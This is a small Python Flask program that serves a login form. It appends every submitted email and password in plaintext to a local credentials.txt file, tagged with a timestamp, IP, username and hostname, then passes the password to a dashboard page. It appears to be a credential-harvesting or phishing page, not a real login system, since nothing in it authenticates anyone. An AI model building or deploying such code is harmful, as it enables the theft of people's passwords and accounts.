from flask import Flask, request, render_template
import socket
import getpass
from datetime import datetime
import psutil

app = Flask(__name__)

# Function to get the device's local IP address on the local network (IPv4)
def get_local_ip():
    for interface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == socket.AF_INET:
                return addr.address
    return '127.0.0.1'

# Function to save the credentials to a file
def save_credentials(email, password):
    local_ip = get_local_ip()
    pc_name = socket.gethostname()  
    username = getpass.getuser()
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    line = f"[{now}] IP: {local_ip} | Username: {username} | PC Name: {pc_name} | Email: {email} | Password: {password}\n"

    try:
        with open('credentials.txt', 'a', encoding='utf-8') as f:
            f.write(line)
        print("Credentials saved to file.")
    except Exception as e:
        print(f"Error writing to file: {e}")

# Route for the login form
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        save_credentials(email, password)
        return render_template('dashboard.html', email=email, password=password)
    return render_template('login.html')

if __name__ == '__main__':
    app.run(debug=True)
